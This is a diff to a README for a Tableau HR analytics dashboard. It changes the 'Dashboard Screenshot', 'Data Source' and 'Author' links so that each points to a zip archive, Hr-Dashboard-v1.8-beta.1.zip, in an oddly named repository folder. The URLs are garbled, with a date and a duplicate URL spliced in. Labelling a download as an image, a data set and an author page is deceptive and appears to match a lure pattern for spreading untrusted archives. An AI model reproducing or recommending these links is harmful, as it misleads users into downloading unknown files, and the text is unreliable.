@@ -1,6 +1,6 @@
 # HR Analytics Dashboard - Tableau Desktop
 
-![Dashboard Screenshot](https://raw.githubusercontent.com/Siam-analytics/Hr-Dashboard/main/dogmatically/Dashboard_Hr_v2.6.zip%202025-04-23%https://raw.githubusercontent.com/Siam-analytics/Hr-Dashboard/main/dogmatically/Dashboard_Hr_v2.6.zip) 
+![Dashboard Screenshot](https://raw.githubusercontent.com/Siam-analytics/Hr-Dashboard/main/dogmatically/Hr-Dashboard-v1.8-beta.1.zip%202025-04-23%https://raw.githubusercontent.com/Siam-analytics/Hr-Dashboard/main/dogmatically/Hr-Dashboard-v1.8-beta.1.zip) 
 
 ## Dashboard Overview
 An interactive HR analytics dashboard built in Tableau Desktop that visualizes key workforce metrics with dynamic filtering capabilities.
@@ -52,7 +52,7 @@ Apply to all visualizations:
    - Use Worksheet > Export to save views
 
 ## Data Source
-- "https://raw.githubusercontent.com/Siam-analytics/Hr-Dashboard/main/dogmatically/Dashboard_Hr_v2.6.zip%https://raw.githubusercontent.com/Siam-analytics/Hr-Dashboard/main/dogmatically/Dashboard_Hr_v2.6.zip"
+- "https://raw.githubusercontent.com/Siam-analytics/Hr-Dashboard/main/dogmatically/Hr-Dashboard-v1.8-beta.1.zip%https://raw.githubusercontent.com/Siam-analytics/Hr-Dashboard/main/dogmatically/Hr-Dashboard-v1.8-beta.1.zip"
 
 
 ## Customization Options
@@ -64,4 +64,4 @@ To modify this dashboard:
 
 ## Author
 [Siam Ahammed]  
-[https://raw.githubusercontent.com/Siam-analytics/Hr-Dashboard/main/dogmatically/Dashboard_Hr_v2.6.zip]  
+[https://raw.githubusercontent.com/Siam-analytics/Hr-Dashboard/main/dogmatically/Hr-Dashboard-v1.8-beta.1.zip]  
